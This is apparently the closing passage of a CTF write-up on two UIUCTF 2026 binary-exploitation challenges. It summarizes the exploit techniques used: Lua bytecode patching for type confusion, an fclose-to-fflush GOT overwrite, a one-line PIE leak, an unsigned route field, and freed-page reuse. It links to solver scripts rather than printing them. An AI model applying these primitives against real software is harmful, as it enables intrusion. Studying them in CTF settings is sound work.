- **Sparxie** checks that the Spotlight Pass has a valid BLAKE2s seal — over 36 bytes that do not include the 16-byte route. The relay router assumes the route is authenticated. And separately, the timeline dedupes clip userdata identity but not `(owner, offset, length)`, so freed-page reuse is one line of Lua away.

Portable techniques from the set:

- **Compile with the shipped compiler; patch after.** Firefly's `luaL_loadbufferx` accepts any structurally valid bytecode. Producing that bytecode with `luac`, then rewriting individual opcodes, is far cheaper than assembling a Lua binary chunk by hand. The one-instruction change per primitive keeps the compiler's register allocation intact.
- **Payload arithmetic + tag preservation = type confusion.** Any VM primitive that computes on a value's payload while leaving its tag alone is a type-confusion tool. `chgivalue` in Lua 5.5 is the textbook example; equivalents exist in other VMs (V8's Smi/HeapObject tag preservation, CPython's tagged pointer arithmetic in some optimization tiers).
- **Partial RELRO is a stdio-lifetime primitive.** `fclose@GOT → fflush` is the least dramatic-looking one-write exploit possible, and it is exactly enough to keep `/flag.txt`'s buffer alive after the parser rejects it. Any binary shipping partial RELRO plus one arbitrary write should be looked at through this lens.
- **Light C functions leak PIE for free.** Base-library functions with no upvalues store the raw function address in their Lua value. `string.format("%p", print)` (or in Firefly, `tostring(print):match("0x%x+")` since `%p` is available) is a one-line PIE leak — no info-leak bug required.
- **Seal your metadata, not just your payload.** Sparxie's archive seal skipping the route field is the same pattern as Zip-Slip's local-file-inclusion, JWT's `alg:none`, and any signed-envelope format that omits any header that later routes the message. If a byte can change the destination and it is not covered by the signature, it will change the destination.
- **Dedupe by identity, not by tuple.** Sparxie's timeline groups clips by `(owner, offset, length)` because the intent was to relocate identical ranges once. But the sandbox only guaranteed that no clip userdata appeared twice — an attacker-controlled *distinct* userdata with the same tuple slips right through. If a check needs to enforce uniqueness of some *thing*, dedupe on the identity of the thing, not on its coordinates.
- **Freed-page reuse is a targeted primitive when the allocator is deterministic.** Sparxie's shared free list guarantees that the queue allocation reuses the page just freed by `render()`. Any allocator that does LIFO on a static free list turns "free" into "hand the attacker a chosen typed view."
- **You can put crypto inside the sandbox.** Sparxie's witness reproduction runs BLAKE2s entirely in Lua — because `string.pack`, `string.unpack`, `string.sub`, and `string.rep` are still available. Any sandbox that keeps enough of the string library to XOR and rotate can host any hash or block cipher.

## Reproduce it yourself

Each challenge ships a standalone solver in the [UIUCTF 2026 repository](https://github.com/Abdelkad3r/UIUCTF-2026):

- [`firefly-complete-combustion/`](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/firefly-complete-combustion) — readable [`exploit.lua`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/firefly-complete-combustion/exploit.lua), the bytecode patcher [`build_exploit.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/firefly-complete-combustion/build_exploit.py), the pre-built [`exploit-request.bin`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/firefly-complete-combustion/exploit-request.bin), and [`solve.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/firefly-complete-combustion/solve.py). The full handout — challenge binary, `luac`, libc, dynamic linker, and Docker/nsjail config — is under `handout/`.
- [`sparxie-vanishing-encore/`](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/sparxie-vanishing-encore) — readable [`exploit.lua`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/sparxie-vanishing-encore/exploit.lua) with the embedded BLAKE2s implementation, the SPX2 packer [`pack.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/sparxie-vanishing-encore/pack.py), the pre-built [`exploit.spx`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/sparxie-vanishing-encore/exploit.spx), and [`solve.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/sparxie-vanishing-encore/solve.py). The full handout — `sparxicle.wasm`, Emscripten JS host, Spotlight Pass, source, Dockerfile, and nsjail config — is under `handout/`.

Both live solvers use only Python's standard library. The Firefly build needs Linux x86-64 (or Docker) to run the supplied `luac`.

Browse the full [CTF writeups](/ctf-writeups/) archive for more sandbox-escape and VM-exploitation walkthroughs, or continue the UIUCTF 2026 series with the [Reverse Engineering writeup](/ctf-writeups/uiuctf-2026-reverse-engineering-writeup/) (vector-cache SIGILL VM, GODMODE//999 AArch64 firmware + custom SHA-256, Veil of Evernight ELF code-cave patching, glyphs lambda-calculus term graph), the [Cryptography writeup](/ctf-writeups/uiuctf-2026-crypto-writeup/) (plactic monoid + CKKS oracle + Elder Futhark), the [Miscellaneous writeup](/ctf-writeups/uiuctf-2026-misc-writeup/) (three jail escapes), the [Nabi AI web writeup](/ctf-writeups/uiuctf-2026-web-nabi-ai-writeup/) (Next.js Server Action SSRF + OpenBao ACL wildcard), or the [Something Handmade OSINT writeup](/ctf-writeups/uiuctf-2026-osint-something-handmade-writeup/).

---

*This writeup is part of the CyberSecurity Elite [UIUCTF 2026](/series/uiuctf-2026/) series. Handouts, per-challenge READMEs, and dependency-conscious solvers for both Binary Exploitation challenges are published at [github.com/Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026).*
